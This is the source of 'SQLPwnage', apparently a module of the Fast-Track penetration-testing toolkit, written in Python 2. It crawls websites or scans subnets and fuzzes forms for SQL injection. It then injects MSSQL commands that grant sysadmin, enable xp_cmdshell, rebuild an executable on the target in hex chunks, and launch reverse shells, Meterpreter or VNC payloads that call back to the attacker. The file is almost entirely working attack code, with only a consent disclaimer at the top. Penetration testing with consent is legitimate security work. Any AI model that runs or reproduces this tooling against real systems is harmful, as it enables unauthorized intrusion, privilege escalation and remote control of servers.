#!/usr/bin/env python
###########################################################################                         
# Created by: Andrew Weidenhamer and David Kennedy                        #
#                                                                         #
# Email: aweidenhamer@SecureState.com                                     #
#                                                                         #                                     
# DISCLAIMER: This is only for testing purposes and can only be           # 
# used where strict consent has been given. Do not use this for           #
# illegal purposes period.                                                #
#                                                                         #
###########################################################################
import sys,os,time,re,subprocess                                          #
###########################################################################

################################
# Define CWD and Metasploit DIR
################################
definepath=os.getcwd()
sys.path.append("%s/bin/ftsrc/" % (definepath))
import include
include.print_banner()

# define metasploit path
meta_path=file("%s/config/fasttrack_config" % (definepath),"r").readlines()
for line in meta_path:
    line=line.rstrip()
    match=re.search("METASPLOIT_PATH",line)
    if match:
       line=line.replace("METASPLOIT_PATH=","")
       metapath=line

remold=subprocess.Popen("rm bin/appdata/ipaddr 2> /dev/null", shell=True).wait()
print "    Checking SQLPwnage dependencies required to run...\n"
try:
   from BeautifulSoup import BeautifulSoup
except ImportError:
   print "    BeautifulSoup is not installed. Please run python setup.py install from the Fast-Track root directory.\n"
   print "    Exiting Fast-Track...\n\n"
   sys.exit()

try:
   import pymills
   print "*** PyMills is installed. (Check) ***"
except ImportError:
   print "!!! *ERROR* PyMills is NOT installed...This is needed for SQLPwnage. *ERROR* !!!"
   answer1=raw_input("Would you like to install it now? yes or no: ")
   if answer1=='yes' or answer1=='y':
      print "Installing PyMills Python Module, this may take a few mins"
      grabsetuptools=os.system("svn co http://svn.python.org/projects/sandbox/branches/setuptools-0.6/ pym;cd pym;python setup.py install;cd ..;rm -rf pym")
      installpymills=os.system('wget http://pypi.inqbus.de/pymills/pymills-3.4.tar.gz;tar -zxvf pymills-3.4.tar.gz;mv pymills-3.4 pymills;cd pymills/;python setup.py install;cd ..;rm -rf pymills*')
      print "PyMills Installed.."
      print "Re-checking dependancy"
      try:
         import pymills
         print "Installed successfully...This module is now functioning."
         count=count+1
      except ImportError:
         print "PyMills is installed but you will need to restart Fast-Track in order for it to work properly."
	 sys.exit()

# DAVE Payload Delivery here
def Payload_Delivery(f,my_input):
                                                import random
                                                try:
                                                    payloadchoice=sys.argv[6]
                                                except IndexError:
                                                    payloadchoice=raw_input("""\nWhat type of payload do you want?\n\n1. Custom Packed Fast-Track Reverse Payload (AV Safe)\n2. Metasploit Reverse VNC Inject (Requires Metasploit)\n3. Metasploit Meterpreter Payload (Requires Metasploit)\n4. Metasploit TCP Bind Shell (Requires Metasploit)\n\nSelect your choice: """)
                                                try:
                                                   port=sys.argv[7]
                                                except IndexError:
                                                   port=raw_input("Enter the port you want to listen on: ")
						try:
                                                   if os.path.isfile("bin/appdata/ipaddr"):
                                                      fileopen=file("bin/appdata/ipaddr","r").readlines()
                                                      for line in fileopen:
                                                          ipaddr=line.rstrip()
                                                   if not os.path.isfile("bin/appdata/ipaddr"):
              	        	         		ipaddr=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
       		                    			ipaddr.connect(('google.com', 0))
                                                        ipaddr.settimeout(2)
        		                    		ipaddr=ipaddr.getsockname()[0]
                                                        ipaddrwrite=file("bin/appdata/ipaddr", "w")
                                                        ipaddrwrite.write(ipaddr)
                                                        ipaddrwrite.close()
						except Exception:
							print "No internet connection detected, please enter your IP Address in manually."
							ipaddr=raw_input("Enter your IP here: ") 
                                                        ipaddrwrite=file("bin/appdata/ipaddr", "w")
                                                        ipaddrwrite.write(ipaddr)
                                                        ipaddrwrite.close() 
        		           		time.sleep(2)  
                                                print "[+] Importing 64kb debug bypass payload into Fast-Track... [+]"
                                                # Take our hex2bin payload and read the lines
                                                formatpayload=file("%s/bin/ftsrc/payload/h2b" % (definepath),"r").readlines()
                                                time.sleep(2)
                                                print "[+] Import complete, formatting the payload for delivery.. [+]"
                                                # Set counters
                                                r=0
                                                x=0
                                                z=0
                                                # Delete old stuff and pipe out error messages to /dev/null
                                                delold=subprocess.Popen("rm %s/bin/appdata/h2bformat* 2> /dev/null" % (definepath), shell=True).wait()
                                                for line in formatpayload:
                                                   # We use this to format our payload to a specific format
                                                   writepayload=open("%s/bin/appdata/h2bformat%s" % (definepath,z),"a")                                                                                                                                                   
                                                   line=line.rstrip()
                                                   # Set the first request
                                                   if r < 1:
                                                      line=(r"';exec master..xp_cmdshell '%s > h2b%s'" % (line,z))
                                                   if r > 0:
                                                     line=(r";exec master..xp_cmdshell '%s >>h2b%s'" % (line,z))
                                                   # Tick tock the counter goes up
                                                   r=r+1                                    
                                                   writepayload.write(line)
                                                   x=x+1    
                                                   # Change number 300 here to increase or decrease H2b Split  
                                                   if x > 100:
                                                      # Reset the counters
                                                      writepayload.write("--")
                                                      z=z+1
                                                      x=0
                                                      r=0                                               
                                                writepayload.write("--")
                                                writepayload.close()
                                                z=z+1 
                                                print "[+] Payload Formatting prepped and ready for launch. [+]"
                                                print "[+] Executing SQL commands to elevate account permissions. [+]"
                                                # Here we try to elevate rights to "sa", its kinda lame but has worked in the past
                                                payload=("';declare @moo varchar(50); set @moo = (select SYSTEM_USER);exec master.dbo.sp_addsrvrolemember @moo, 'sysadmin'--")
		           			f[my_input] = payload
                      	           		req = f.click()
				            	urllib2.urlopen(req)
                                                # No stinkin' xp_cmdshell? Well whoppppieeee
                                                print "[+] Initiating stored procedure: 'xp_cmdhshell' if disabled. [+]"
                                                payload=("';exec master.dbo.sp_configure 'show advanced options', 1;RECONFIGURE;exec master.dbo.sp_configure 'xp_cmdshell', 1;RECONFIGURE;--")                                          
		           			f[my_input] = payload
                      	           		req = f.click()
				            	urllib2.urlopen(req)
                                                # DEP usually isn't a problem, this was done just to be safe..
                                                #print "[+] Turning off Data Execution Prevention (DEP) if enabled... [+]"
                                                #payload=("';exec master..xp_cmdshell 'bcdedit.exe /set nx AlwaysOff'--")
		           			#f[my_input] = payload
                      	           		#req = f.click()
				            	#urllib2.urlopen(req)
                                                # Yet another counter, theres like 50 more as this goes down :P   
                                                t=0
                                                endstring=("--")                        
                                                # OK. This one is a long story, if you can't do all your echo's in 1 sql query, it gets suppppppppper buggy
                                                # and starts echo'ing multiple times with totally screws everything up. So here we take all the files that we
                                                # made and type them all together in 1 SQL query, it works, its a hack, we know, but it works :)
                                                filewrite=file("%s/bin/appdata/typestring" % (definepath), "w")
                                                while t != z:                                                  
                                                    if t == 0:
                                                       formatpayload=("';exec master..xp_cmdshell 'type h2b%s > h2b'" % (t)) 
                                                    if t > 0:
                                                       formatpayload=(";exec master..xp_cmdshell 'type h2b%s >> h2b'" % (t)) 
                                                    t=t+1 
                                                    filewrite.write(formatpayload)                                                    
                                                filewrite.write(endstring) 
                                                filewrite.close()   
                                                print "[+] Delivery Complete. [+]"  
                                                try:
                                                        # custom reverse payload                                                                     
                                                        if payloadchoice=='1':
                                                           delivery=("reverse")
                                                           # Start listeners
						           ncstarter=pexpect.spawn('xterm -geometry 60x20 -bg black -fg green -fn *-fixed-*-*-*-20-* -T "Fast-Track SQLPwnage SQL Injector" -e nc -lvp %s' % (port))
                                                        # standard reverse tcp vnc
                                                        if payloadchoice == '2':
                                                           delivery=("metasploit")
                                                           print "Launching MSFCLI VNC Handler."
                                                           msflaunch=pexpect.spawn("""xterm -geometry 60x20 -bg black -fg green -fn *-fixed-*-*-*-20-* -T "Fast-Track SQLPWnage Metasploit VNC Inject Listener" -e %s/msfcli exploit/multi/handler PAYLOAD=windows/vncinject/reverse_tcp LHOST=%s LPORT=%s E""" % (metapath,ipaddr,port))
                                                           print "Creating Metasploit Reverse VNC Payload.."                                                          
                                                           msfpayloadcreate=subprocess.Popen(r"%s/msfpayload windows/vncinject/reverse_tcp LHOST=%s LPORT=%s AUTOVNC=true X > %s/bin/appdata/metasploit" % (metapath,ipaddr,port,definepath), shell=True).wait()
                                                        # Standard reverse tcp meterpreter shell
                                                        if payloadchoice == '3':
                                                           delivery=("metasploit")
                                                           print "Launching MSFCLI Meterpreter Handler"
                                                           msflaunch=pexpect.spawn("""xterm -geometry 60x20 -bg black -fg green -fn *-fixed-*-*-*-20-* -T "Fast-Track SQLPWnage Metasploit Meterpreter Listener" -e %s/msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s E""" % (metapath,ipaddr,port))
                                                           print "Creating Metasploit Reverse Meterpreter Payload.."                                                          
                                                           msfpayloadcreate=subprocess.Popen(r"%s/msfpayload windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s X > %s/bin/appdata/metasploit" % (metapath,ipaddr,port,definepath), shell=True).wait()
                                                        # Standard bind shell
                                                        if payloadchoice == '4':
                                                           delivery=("bindshell")  
                                                           msfpayloadcreate=subprocess.Popen(r"%s/msfpayload windows/shell_bind_tcp LPORT=%s X > %s/bin/appdata/bindshell" % (metapath,port,definepath), shell=True).wait() 
                                                        # start the binary to hex conversion stuff here
                                                        print "Taking raw binary and converting to hex."
                                                        import binascii 
                                                        if delivery==("metasploit"):
           						   fileopen=file('%s/bin/appdata/%s' % (definepath,delivery),'rb').readlines()
                                                        if delivery==("bindshell"):
                                                           fileopen=file('%s/bin/appdata/%s' % (definepath,delivery),'rb').readlines()
                                                        if delivery ==("reverse"):
               							fileopen=file('%s/bin/ftsrc/payload/%s' % (definepath,delivery),'rb').readlines()
							filewrite=file('%s/bin/appdata/reversehex' % (definepath),'w')
							for line in fileopen:
                                                          # Convert our binary to straight hex, no formatting.
 							  line=binascii.hexlify(line)
							  filewrite.write(line)
							filewrite.close()
							fileopen2=open('%s/bin/appdata/reversehex' % (definepath))
							filewrite2=file("%s/bin/appdata/reversehexsplit" % (definepath),"w")
                                                        print "Raw binary converted to straight hex."
                                                        time.sleep(2)
                                                except Exception: pass
                                                # The major try block here                                                                      
                   				try:
                                                        print "[+] Bypassing Windows Debug 64KB Restrictions. Evil. [+]"
                                                        s=0
                                                        b=s+1
                                                        try:
                                                           # Deliver the payload
                                                           while z != s:                                   
                                                              payloadopen=file("%s/bin/appdata/h2bformat%s" % (definepath,s),"r").readlines()
                                                              for line in payloadopen:
                                                                      # Broken into chunks incase its GET, POST isn't an issue but session requests are limited with GET
                                                                      print "[+] Sending chunked payload. Number %s of %s. This may take a bit. [+]" % (b,z)
                                                                      line=line.rstrip()
                					              payload = (line)                                                               
		              					      f[my_input] = payload
                         	           			      req = f.click()
			   	            			      urllib2.urlopen(req)
                                                              s=s+1
                                                              b=b+1 
                                                        # Throw errors just in case                                                     
                                                        except Exception,e:
                                                            print e  
                                                        readtype=file("%s/bin/appdata/typestring" % (definepath), "r").readlines()
                                                        for line in readtype:
                                                             line=line.rstrip()
                					     payload = (line)                                                                   
		              			             f[my_input] = payload
                         	           	             req = f.click()
			   	            	             urllib2.urlopen(req)   
                                                        # here we take our special hex and convert back to a binary
                                                        print "[+] Conversion from hex to binary in progress. [+]"                                
                					payload = ("';exec master..xp_cmdshell 'debug<h2b'--")                                                                  
		              			        f[my_input] = payload
                         	           	        req = f.click()
			   	            	        urllib2.urlopen(req)
                                                        print "[+] Conversion complete. Moving the binary to an executable. [+]"
                                                        # debug places whatever as .bin, we just move it to h2b.exe
                					payload = ("';exec master..xp_cmdshell 'move moo.bin h2b.exe'--")                                                                 
		              			        f[my_input] = payload
                         	           	        req = f.click()
			   	            	        urllib2.urlopen(req)                                     
                                                        # Split into chunks if we run into GET requests.
                                                        print "[+] Splitting the hex into 100 character chunks [+]"
							while fileopen2:
 							  a=fileopen2.read(100).rstrip()
  							  if a == "":
 							      break
  							  filewrite2.write(a)
  							  filewrite2.write("\n")
							filewrite2.close()
                                                        time.sleep(2)
                                                        print "[+] Split complete. [+]"
                                                        print "[+] Prepping the payload for delivery. [+]"
                                                        # Counters, Counters, and more Counters
                                                        r=0
                                                        x=0
                                                        z=0
                                                        import string,random
                                                        # we generate a random name here in case theres multiple payloads running, ran into issues where if one was
                                                        # running and the same name, the next sploit wouldn't work.
                                                        randomgen=random.randrange(1,10000)
                                                        ftpayloadran=("ftpayload")
                                                        ftpayloadran=str(ftpayloadran)+str(randomgen)
                                                        delold=subprocess.Popen("rm %s/bin/appdata/reversehexdelivery* 2> /dev/null" % (definepath), shell=True).wait()
							fileopen=file("%s/bin/appdata/reversehexsplit" % (definepath),"r").readlines()
                                                        for line in fileopen:
                                                           writepayload=open("%s/bin/appdata/reversehexdelivery%s" % (definepath,z),"a")                                                                                                                                                   
                                                           line=line.rstrip()                                                      
                                                           if r < 1:
                                                              line=(r"';exec master..xp_cmdshell 'echo %s>%s%s'" % (line,ftpayloadran,z))
                                                           if r > 0:
                                                             line=(r";exec master..xp_cmdshell 'echo %s>>%s%s'" % (line,ftpayloadran,z))
                                                           r=r+1                                                 
                                                           writepayload.write(line)
                                                           x=x+1   
                                                            
                                                           # Change number 30 here to increase or decrease Payload Split  
                                                           if x > 100:
                                                              writepayload.write("--")
                                                              z=z+1
                                                              x=0
                                                              r=0                                           
                                                        writepayload.write("--")
                                                        writepayload.close()
                                                        z=z+1
                                                        t=0
                                                        endstring=("--")   
                                                        # Format type into files here                                              
                                                        filewrite=file("%s/bin/appdata/typestring" % (definepath), "w")
                                                        while t != z:                                   
                                                            if t == 0:
                                                               formatpayload=("';exec master..xp_cmdshell 'type %s%s>%s'" % (ftpayloadran,t,ftpayloadran))
                                                            if t > 0:
                                                               formatpayload=(";exec master..xp_cmdshell 'type %s%s>>%s'" % (ftpayloadran,t,ftpayloadran))
                                                            t=t+1 
                                                            filewrite.write(formatpayload)                                                    
                                                        filewrite.write(endstring) 
                                                        filewrite.close()  
                                                        s=0
                                                        b=s+1
                                                        try:
                                                           while z != s:                                   
                                                              payloadopen=file("%s/bin/appdata/reversehexdelivery%s" % (definepath,s),"r").readlines()
                                                              for line in payloadopen:                                                                   
                                                                      line=line.rstrip()
                					              payload = (line)    
                                                                      print "Sending chunk %s of %s, this may take a bit..." % (b,z)                                                          
		              					      f[my_input] = payload
                         	           			      req = f.click()
			   	            			      urllib2.urlopen(req)
                                                              #increase tick
                                                              s=s+1      
                                                              b=b+1                                                  
                                                        except Exception,e:
                                                            print e  
                                                        # Type files into one file
                                                        readtype=file("%s/bin/appdata/typestring" % (definepath), "r").readlines()
                                                        for line in readtype:
                                                             line=line.rstrip()
                					     payload = (line)                                                                   
		              			             f[my_input] = payload
                         	           	             req = f.click()
			   	            	             urllib2.urlopen(req)
                                                        print "Using H2B Bypass to convert our Payload to Binary.."
                                                        launchpayload=("';exec master..xp_cmdshell 'h2b.exe %s'--" % (ftpayloadran)) 
                                                        payload = (launchpayload)
                                                        f[my_input] = payload
                                                        req = f.click()
                                                        urllib2.urlopen(req)
                                                        launchpayload2=("';exec master..xp_cmdshell '%s %s %s'--" % (ftpayloadran,ipaddr,port)) 
                                                        print "Running cleanup before launching the payload...."
                                                        cleanup=("';exec master..xp_cmdshell 'del h2b*'--")
                                                        f[my_input]=cleanup
                                                        req=f.click()
                                                        urllib2.urlopen(req)
                                                        print "[+] Launching the PAYLOAD!! This may take up to two or three minutes. [+]"
                                                        if delivery == 'bindshell':                                                 
                                                           targetip=raw_input("If successful, a bind shell should be on the system. Enter the IP or Hostname of the victim: ")                                             
                                                           msflaunch=pexpect.spawn("""xterm -geometry 60x20 -bg black -fg green -fn *-fixed-*-*-*-20-* -T "Fast-Track SQLPWnage Metasploit Bind Shell" -e nc %s %s""" % (targetip,port))  
             					        payload = (launchpayload2)
		           		                f[my_input] = payload
                      	           		        req = f.click()
				            	        urllib2.urlopen(req)   
                                                        f[my_input]="erasepriorvar"                                                                                                                                       		
                                            		print "You should have a shell if everything went good..Might take a couple seconds\n"
						except Exception,e:
                                                                print e 
							#pass
							#try:
							#	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
							#	sock.connect((ipaddr, (port)))
							#except socket.error:
							#	sys.stdout.write('\a')
							#	sys.stdout.flush()	
								print "I HAZ BEEN PWNED O KNOS!!!!!!"
                                                                cleanup=raw_input("Would you like to run cleanup on the remote server to remove the files, y or n: ")
                                                                if cleanup == 'n' : 
                                                                   print "\nExiting Fast-Track..."
                                                                   sys.exit()
                                                                if cleanup == 'y':
                                                                   launchpayload1=("';exec master..xp_cmdshell 'rm ftpayload*'--")
                                                                   launchpayload2=("';exec master..xp_cmdshell 'rm h2b*'--")
             					                   payload = (launchpayload1)
		           		                           f[my_input] = payload
                      	           		                   req = f.click()
				            	                   urllib2.urlopen(req)   
             					                   payload = (launchpayload2)
		           		                           f[my_input] = payload
                      	           		                   req = f.click()
				            	                   urllib2.urlopen(req)  
                                                                   breakpoint=raw_input("Press control-c to exit Fast-Track or press enter to continue attacking.")
                                                                else:
                                                                    print "Only hit y or n, try again..." 
                                                                    cleanup
                                                                


def Exploit_Error(f):   
        #####################################################################################
	#####################################################################################
	#Looks for SQL injection by injecting form fields with single quotes and other stuff
       	#####################################################################################
        counter = open('%s/bin/appdata/fields.txt' % (definepath), 'r')
        count=0
        for line in counter:
            line=line.rstrip()
            count=count+1
        print "[+] Number of forms detected: "+str(count)+ " [+]\n"
        copy= subprocess.Popen("cp %s/bin/appdata/fields.txt %s/bin/appdata/fields2.txt" % (definepath,definepath), shell=True).wait()              
        copy= open ("%s/bin/appdata/fields2.txt" % (definepath), "r")
	inputter = open('%s/bin/appdata/fields.txt' % (definepath), 'r')
	for line in inputter.readlines():
		my_input = line.strip()
		login = open('%s/bin/ftsrc/sqlpwnage/app/login_bypass.txt' % (definepath), 'r')
		for my_line in login.readlines():
			sqlinject = my_line.strip()
			try:
				count2=0
				while count2 != count:
                                    count2=count2+1
                                    for line3 in copy:
					       line3=line3.strip()
     	                                       f[line3] = "TEST"
                                f[my_input] = sqlinject                                    
			except ClientForm.ControlNotFoundError:
				pass
                        try:
         			req = f.click()
                        except Exception: 
                                   pass
			try:
                           try:
			         urllib2.urlopen(req).read()
                           except UnboundLocalError: pass                      
			except URLError, e:
				try:
					exeception = e.read()
				except AttributeError:
					pass
                                try:
              		           str(exeception)
                                except Exception: pass
                                try:
         				error = re.search('SQL|SqlClient.SqlException|sql|ODBC|odbc', exeception)
	          			if (error):
		               			print "A SQL Exception has been encountered in the \""+my_input+"\" input field of the above website."
			          		if (error):
                                                       Payload_Delivery(f,my_input)
                                except Exception:
                                          pass
def Exploit_Blind(f):
	###########################################################################################################################################
	##########################################################################################################################################
	#Blind SQL Injection
	###########################################################################################################################################
        counter = open('%s/bin/appdata/fields.txt' % (definepath), 'r')
        count=0
        for line in counter:
            line=line.rstrip()
            count=count+1
        print "[+] Number of forms detected: "+str(count)+" [+]\n"
        copy= subprocess.Popen("cp %s/bin/appdata/fields.txt %s/bin/appdata/fields2.txt" % (definepath,definepath), shell=True).wait()
        copy= open ("%s/bin/appdata/fields2.txt" % (definepath), "r")
        inputter = open('%s/bin/appdata/fields.txt' % (definepath), 'r')
        for line in inputter.readlines():
                my_input = line.strip()
                login = open('%s/bin/ftsrc/sqlpwnage/app/login_bypass.txt' % (definepath), 'r')
                for my_line in login.readlines():
                        sqlinject = my_line.strip()
                        try:
                                count2=0
                                while count2 != count:
                                    count2=count2+1
                                    for line3 in copy:
                                               line3=line3.strip()
                                               f[line3] = "TEST"
                                f[my_input] = sqlinject
			except Exception,e: print e
                        Payload_Delivery(f,my_input) 

def Crawl_URL(option, c, flag):
	if (flag == 0):
		##################################################################################################################################################
		#Crawl User Entered Website
		##################################################################################################################################################
		# get max depth from config
		counter=0
		fileopen=file("bin/config/config", "r").readlines()
		for line in fileopen:
			search=re.search("MAXDEPTH=",line)
			if search:
				line=line.rstrip()
				depth=line.split("=")
				depth=depth[1]
				counter=1
				print depth
		if counter == '0':
			depth=int("100000")
		cmd = "python %s/bin/ftsrc/sqlpwnage/app/spider/spider.py -d %s " %(definepath,depth) +option
		os.system(cmd)
		print
		print "Spidering is complete."
		print
	if (flag == 1):
		crawled = open('%s/bin/appdata/crawled.txt' % (definepath), 'w')
		print >> crawled, option
	##################################################################################################################################################
	##################################################################################################################################################
	#Open Crawled Websites One by One looking for SQL injection
	##################################################################################################################################################
	crawled = open('%s/bin/appdata/crawled.txt' % (definepath), 'r')
	for line in crawled.readlines():
		site = line.strip()
		value = re.search(str(option), site)
		print '*************************************************************************'
		print site	
		print '*************************************************************************'
		if (str(value) != 'None'):
			request = urllib2.Request(site)
			try:
				response = urllib2.urlopen(request)
			except URLError, e:
				pass
			try:
				forms = ClientForm.ParseResponse(response, backwards_compat=False) 
			except DeprecationWarning:
				pass
			except TypeError:
				pass
			except NameError:
				pass
			except ClientForm.ParseError:
				pass
			try:
				my_form = str(forms)
			except NameError:
				my_form = '[]'
			if (my_form != "[]"):
				output = open('%s/bin/appdata/output.txt' % (definepath), 'w')
				response.close()
				form = forms[0]
				#####################################################################################################################################
				#Populates Form Input and Submit Button IDs
				####################################################################################################################################
				print >> output, form
				output.close()
				formfields = open('%s/bin/appdata/fields.txt' % (definepath), 'w')
				output = open('%s/bin/appdata/output.txt' % (definepath), 'r')
				for line in output.readlines():	
					match = re.search('Control', line)
					if (match):
						notinject = re.search('readonly|CheckboxControl|ImageControl|SelectControl|Submit|IgnoreControl|ListControl|SubmitControl|RadioControl', line)
						if (not notinject):
							print
							my_match = re.search('\((.*)\)', line)
							newstr = str(my_match.group(1))
							newer_match = re.match('(.*)=', newstr)
							print >> formfields, newer_match.group(1) 	
				output.close()
				formfields.close()
				if (c == '2'):
					Exploit_Error(form)
				if (c == '1' or c == '3'):                                
					Exploit_Blind(form)


################################
# End Function Definitions
################################

##### Print welcome screen #####
# Import Psyco if available
################################

###########################################################################
# Check to make sure that this script is running under root
###########################################################################
if os.geteuid() != 0:
   print
   print "    Fast-Track not running under root. Please re-run the tool under root...\n"
   sys.exit(1)

try:
   import psyco
   psyco.full()
# Pass if import unsuccessful
except ImportError:
   print "    Psyco not detected....Recommend installing it for increased speeds."
   pass
# End Pysco Availability
try:
	import ClientForm	
	import os
	import pymills
	import urllib2
	import re
	import urlparse	
	import optparse
	import collections
	from BeautifulSoup import BeautifulSoup
	from urllib2 import urlopen
	from urllib2 import URLError
	from ClientForm import ParseResponse
	import socket, pexpect

except ImportError:
	print "    One or more of the dependencies needed to run"
	print "    Run python setup.py install in the Fast-Track root."
	


# Main Menu to choose
try:    
	#while 1==1 : 
                try:
                   choice=sys.argv[3]
                except IndexError:
                   print """

    SQLPWnage written by: Andrew Weidenhamer and David Kennedy

    SQLPwnage is a mass pwnage tool custom coded for Fast-Track. SQLPwnage will attempt
    to identify SQL Injection in a website, scan subnet ranges for web servers, crawl entire
    sites, fuzz form parameters and attempt to gain you remote access to a system. We use
    unique attacks never performed before in order to bypass the 64kb debug restrictions
    on remote Windows systems and deploy our large payloads without restrictions.

    This is all done without a stager to download remote files, the only egress connections
    made are our final payload. Right now SQLPwnage supports three payloads, a reverse
    tcp shell, metasploit reverse tcp meterpreter, and metasploit reverse vnc inject.

    Some additional features are, elevation to "sa" role if not added, data execution prevention
    (DEP) disabling, anti-virus bypassing, and much more!

    This tool is the only one of its kind, and is currently still in beta. 
                """
                   choice=raw_input('''    SQLPwnage Main Menu:

    1. SQL Injection Search/Exploit by Binary Payload Injection (BLIND)
    2. SQL Injection Search/Exploit by Binary Payload Injection (ERROR BASED)
    3. SQL Injection single URL exploitation

    <ctrl>-c to Cancel

    Enter your choice: ''')
	
		if choice == '1':
			print """
----------------------------------------------------------------
-  							       -	
-							       -
- WARNING:  This module can take a very long time to complete  -
-           and is not recommended until first attempting to   -
-           identify SQL injection by SQL error messages       -
-           (Module 2)                                         -
-						  	       -
- This module has the following two options:                   -  
-                                          		       - 
- 1)  Spider a single URL attempting blind sql injection       -
-     explotation                                              -
-                                                              - 
- 2)  Scan an entire subnet looking for webservers running on  -
-     port 80.  The user will then be prompted with two        -
-     choices: 1) Select a website or, 2) Attempt to spider    -
-     all websites that was found during the scan attempting   -
-     to identify possible SQL Injection.  This module will    -
-     attempt blind SQL injection on every form parameter      -
-     that is identified                                       -
-                                                              -
- This module is NOT based on any error messages but rather    -
- attempts blind sql injection on every single "form"          -
- parameter on every single page.                              -
-                                                              -
- If all goes well a reverse shell will be returned back to    -
- the user.                                                    -
---------------------------------------------------------------- 
"""

                        try:
                           test=sys.argv[4]
                        except IndexError:
           			test = raw_input("""Scan a subnet or spider single URL?\n
	1. url 
	2. subnet (new)
	3. subnet (lists last scan)
					
	Enter the Number: """)
			if (test == '1'):
				print
				output = open('%s/bin/appdata/output.txt' % (definepath), 'w')
				###################################################################################################################################################
				###################################################################################################################################################
				#User Inputs Website
				##################################################################################################################################################
                                try:
                                   option=sys.argv[5]
                                except IndexError:
                  				option = raw_input("Enter IP address (ex: www.xxxxx.com): ")

                                match = re.search('http://', option)
                                if (not match):
                                   match2=re.search('https://', option)
                                   if match2:
                                       print "SSL Detected. Establishing tunnel...."
#                                      print "Currently Fast-Track does not support SSL. Coming soon..."
#                                      sys.exit()
                                       opt=option
                                   if (not match2):
				      opt = ("http://"+option)
                                if (match):
                                   opt=option 
                                print opt                                              
				request = urllib2.Request(opt)
				try:
					response = urllib2.urlopen(request)
					Crawl_URL(opt, choice, 0)	
				except urllib2.URLError, e:
					print "[-] Sorry, no POST parameters were identified on this site [-]"			
			elif (test == '2'):
				try:
                                   ipaddr=sys.argv[5]
                                except Exception:
        				ipaddr=raw_input("Enter the ip range, example 192.168.1.1-254: ")
                                print "Scanning for web servers in the subnet, please wait..."
				cmd = 'sudo nmap -sT -v -PN -p80 ' + ipaddr + ' > %s/bin/ftsrc/sqlpwnage/app/webscan.txt 2> /dev/null' % (definepath)
				os.system(cmd)
				scanres=os.popen("grep \"Discovered\" %s/bin/ftsrc/sqlpwnage/app/webscan.txt" % (definepath)).read()
				if not scanres:
   					print "\nNo WebServers were found...Sorry.\n"
				else:
					cmd = 'grep "Discovered" %s/bin/ftsrc/sqlpwnage/app/webscan.txt | cut -c32-47 > %s/bin/ftsrc/sqlpwnage/app/webopen.txt' % (definepath,definepath)
					os.system(cmd)
					websites = open('%s/bin/ftsrc/sqlpwnage/app/webopen.txt' % (definepath), 'r')
					for line in websites.readlines():
						web = line.strip()
						os.system(cmd)
					scanres2=os.popen("cat %s/bin/ftsrc/sqlpwnage/app/webopen.txt" % (definepath)).read()
					if not scanres:
   						print "\nWebserver found, but does not resolve...Sorry.\n"
					else:
						print
						option3 = raw_input("""Scanning Complete!!! Select a website to spider or spider all??\n\n	1. Single Website\n	2. All Websites\n\n	Enter the Number: """)
						if (option3 == '1'):
							print
							print ("List of Available Hosts:")
							print
							webrange = open('%s/bin/ftsrc/sqlpwnage/app/webopen.txt' % (definepath), 'r')
							x = 1
							for line in webrange.readlines():
								line=line.rstrip()
								print '\t' + str(x) + '.' + " " + line
								compsystem=open("%scomp" % (x), "w")
								compsystem.write(line)
								compsystem.close()
								x = x + 1
							print
							host = raw_input("Enter the number corresponding to the hostname you would like to attempt to spider: ")
							selection = open(host + "comp", "r")
							for line in selection.readlines():
								line=line.strip()
								opt="http://" + line
								Crawl_URL(opt, choice, 0)
						if (option3 == '2'):
							webrange=open('%s/bin/ftsrc/sqlpwnage/app/webopen.txt' % (definepath), 'r')
							for line in webrange.readlines():
								line=line.strip()
								opt="http://" + line
								request = urllib2.Request(opt)
								try:
									print "Attempting to Spider: " + opt
									response = urllib2.urlopen(request)
									Crawl_URL(opt, choice, 0)	
								except urllib2.URLError:
									print 
									print "[-] Sorry, no POST Parameters were identified on this site. [-]"	
			elif (test == '3'):
						print
						print ("List of Available Hosts:")
						print
						webrange = open('%s/bin/ftsrc/sqlpwnage/app/webopen.txt' % (definepath), 'r')
						x = 1
						for line in webrange.readlines():
							line=line.rstrip()
							print '\t' + str(x) + '. ' + line
							compsystem=open("%s/bin/ftsrc/sqlpwnage/app/%scomp" % (definepath,x), "w")
							compsystem.write(line)
							compsystem.close()
							x = x + 1
					        print
						host = raw_input("Enter the number corresponding to the hostname you would like to attempt to spider: ")
						selection = open(host + "comp", "r")
						for line in selection.readlines():
							line=line.strip()
							opt="http://" + line
							Crawl_URL(opt, choice, 0)
			else:
				print
				print "***********************************************************"
				print "Not a Valid Choice!!  Please re-enter a valid menu option."
				print "***********************************************************"
		elif choice == '2':			
			print """
---------------------------------------------------------------
- This module has the following two options:                  -
-                                                             - 
- 1)  Spider a single URL looking for SQL Injection.  If      -
-     successful in identifying SQL Injection, it will then   - 
-     give you a choice to exploit.                           -
-                                                             - 
- 2)  Scan an entire subnet looking for webservers running on -
-     port 80.  The user will then be prompted with two       -
-     choices: 1) Select a website or, 2) Attempt to spider   -
-     all websites that was found during the scan attempting  -
-     to identify possible SQL Injection.  If SQL Injection   -
-     is identified, the user will then have an option to     -
-     exploit.                                                -
-                                                             -
- This module is based on error messages that are most        -
- commonly returned when SQL Injection is prevalent on        -
- web application.                                            -
-                                                             -  
- If all goes well a reverse shell will be returned back to   -
- the user.                                                   -
--------------------------------------------------------------- 
"""
                        try:
                           test=sys.argv[4]
                        except IndexError:
           			test = raw_input("""Scan a subnet or spider single URL?\n
	1. url 
	2. subnet (new)
	3. subnet (lists last scan)
					
	Enter the Number: """)
			if (test == '1'):
				print
				output = open('%s/bin/appdata/output.txt' % (definepath), 'w')
				###############################################################
				###############################################################
				#User Inputs Website
				###############################################################
                                try:
                                   option=sys.argv[5]
                                except IndexError:
             				option = raw_input("Enter IP address (ex: www.xxxxx.com): ")
                                match = re.search('http://', option)
                                if (not match):
                                   match2=re.search('https://', option)
                                   if match2:
                                       print "SSL Detected. Establishing Tunnel..."
#                                      print "Currently Fast-Track does not support SSL. Coming soon..."
#                                      sys.exit()
                                       opt=option
                                   if (not match2):
				      opt = ("http://"+option)
                                if (match):
                                   opt=option 
				request = urllib2.Request(opt)
				try:
					response = urllib2.urlopen(request)

					###################################################
					# Call Crawl_URL Function
					###################################################
					###################################################
					Crawl_URL(opt, choice, 0)	
				except urllib2.URLError,e:
					print e
